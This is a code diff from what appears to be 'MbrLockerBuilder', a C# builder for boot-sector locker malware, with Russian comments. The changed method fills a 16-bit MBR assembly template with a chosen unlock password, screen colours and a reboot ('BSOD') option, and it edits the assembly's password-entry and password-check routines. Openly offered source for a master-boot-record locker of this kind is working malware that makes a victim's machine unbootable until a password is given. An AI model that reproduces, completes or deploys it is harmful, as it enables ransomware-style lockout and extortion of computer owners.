@@ -577,34 +577,34 @@ namespace MbrLockerBuilder
         }
 
         private string GenerateMBR()
-        {
-            string template = null;
+{
+    string template = null;
 
-            try
+    try
+    {
+        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.mbr.asm"))
+        {
+            if (stream != null)
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.mbr.asm"))
+                using (StreamReader reader = new StreamReader(stream))
                 {
-                    if (stream != null)
-                    {
-                        using (StreamReader reader = new StreamReader(stream))
-                        {
-                            template = reader.ReadToEnd();
-                        }
-                    }
+                    template = reader.ReadToEnd();
                 }
             }
-            catch { }
+        }
+    }
+    catch { }
 
-            if (string.IsNullOrEmpty(template))
-            {
-                string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
-                if (File.Exists(localPath))
-                    template = File.ReadAllText(localPath);
-            }
+    if (string.IsNullOrEmpty(template))
+    {
+        string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
+        if (File.Exists(localPath))
+            template = File.ReadAllText(localPath);
+    }
 
-            if (string.IsNullOrEmpty(template))
-            {
-                template = @"BITS 16
+    if (string.IsNullOrEmpty(template))
+    {
+        template = @"BITS 16
 ORG 0x7C00
 
 start:
@@ -772,7 +772,7 @@ get_password:
     mov ah, 0x0E
     mov bh, 0x00
     mov bl, 0x07
-    mov al, '*'
+    mov al, [di - 1]    ; ← ОТОБРАЖАЕМ ВВЕДЕННЫЙ СИМВОЛ
     int 0x10
     jmp .loop
 .backspace:
@@ -807,7 +807,7 @@ check_password:
     lodsb
     or al, al
     jz .check_end
-    cmp al, [di]
+    cmp al, [di]        ; ← ИСПРАВЛЕННАЯ ВЕРСИЯ (РАБОТАЕТ)
     jne .fail
     inc di
     jmp .compare
@@ -840,80 +840,80 @@ password_ok:
 
 times 510 - ($ - $$) db 0
 dw 0xAA55";
-            }
+    }
 
-            // ============================================================
-            // ЗАМЕНА ПАРОЛЯ
-            // ============================================================
-            string password = this.txtPassword.Text.Trim();
-            if (string.IsNullOrEmpty(password)) password = "admin";
+    // ============================================================
+    // ЗАМЕНА ПАРОЛЯ
+    // ============================================================
+    string password = this.txtPassword.Text.Trim();
+    if (string.IsNullOrEmpty(password)) password = "admin";
 
-            string passwordHex;
-            if (ContainsRussian(password))
-            {
-                string cleanPassword = new string(password.Where(c => c < 128).ToArray());
-                if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
-                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
-            }
-            else
-            {
-                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
-            }
+    string passwordHex;
+    if (ContainsRussian(password))
+    {
+        string cleanPassword = new string(password.Where(c => c < 128).ToArray());
+        if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
+        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
+    }
+    else
+    {
+        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
+    }
 
-            template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
+    template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
 
-            // ============================================================
-            // ЗАМЕНА ЦВЕТОВ
-            // ============================================================
-            string textColor = "07";
-            switch (this.cmbTextColor.SelectedIndex)
-            {
-                case 0: textColor = "00"; break;
-                case 1: textColor = "01"; break;
-                case 2: textColor = "02"; break;
-                case 3: textColor = "03"; break;
-                case 4: textColor = "04"; break;
-                case 5: textColor = "05"; break;
-                case 6: textColor = "06"; break;
-                case 7: textColor = "07"; break;
-                case 8: textColor = "08"; break;
-                case 9: textColor = "09"; break;
-                case 10: textColor = "0A"; break;
-                case 11: textColor = "0B"; break;
-                case 12: textColor = "0C"; break;
-                case 13: textColor = "0D"; break;
-                case 14: textColor = "0E"; break;
-                case 15: textColor = "0F"; break;
-            }
+    // ============================================================
+    // ЗАМЕНА ЦВЕТОВ
+    // ============================================================
+    string textColor = "07";
+    switch (this.cmbTextColor.SelectedIndex)
+    {
+        case 0: textColor = "00"; break;
+        case 1: textColor = "01"; break;
+        case 2: textColor = "02"; break;
+        case 3: textColor = "03"; break;
+        case 4: textColor = "04"; break;
+        case 5: textColor = "05"; break;
+        case 6: textColor = "06"; break;
+        case 7: textColor = "07"; break;
+        case 8: textColor = "08"; break;
+        case 9: textColor = "09"; break;
+        case 10: textColor = "0A"; break;
+        case 11: textColor = "0B"; break;
+        case 12: textColor = "0C"; break;
+        case 13: textColor = "0D"; break;
+        case 14: textColor = "0E"; break;
+        case 15: textColor = "0F"; break;
+    }
 
-            string bgColor = "00";
-            switch (this.cmbBgColor.SelectedIndex)
-            {
-                case 0: bgColor = "00"; break;
-                case 1: bgColor = "10"; break;
-                case 2: bgColor = "20"; break;
-                case 3: bgColor = "30"; break;
-                case 4: bgColor = "40"; break;
-                case 5: bgColor = "50"; break;
-                case 6: bgColor = "60"; break;
-                case 7: bgColor = "70"; break;
-            }
+    string bgColor = "00";
+    switch (this.cmbBgColor.SelectedIndex)
+    {
+        case 0: bgColor = "00"; break;
+        case 1: bgColor = "10"; break;
+        case 2: bgColor = "20"; break;
+        case 3: bgColor = "30"; break;
+        case 4: bgColor = "40"; break;
+        case 5: bgColor = "50"; break;
+        case 6: bgColor = "60"; break;
+        case 7: bgColor = "70"; break;
+    }
 
-            // Заменяем фон
-            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
+    // Заменяем фон
+    template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
 
-            // Заменяем цвет текста
-            template = template.Replace("mov bl, 0x07", "mov bl, 0x" + textColor);
+    // Заменяем цвет текста
+    template = template.Replace("mov bl, 0x07", "mov bl, 0x" + textColor);
 
-            // BSOD
-            bool enableBSOD = this.chkBSOD.Checked;
-            if (enableBSOD)
-            {
-                template = template.Replace("jmp hang", "int 0x19");
-            }
+    // BSOD
+    bool enableBSOD = this.chkBSOD.Checked;
+    if (enableBSOD)
+    {
+        template = template.Replace("jmp hang", "int 0x19");
+    }
 
-            return template;
-        }
+    return template;
+}
 
         private string GenerateStage2()
         {
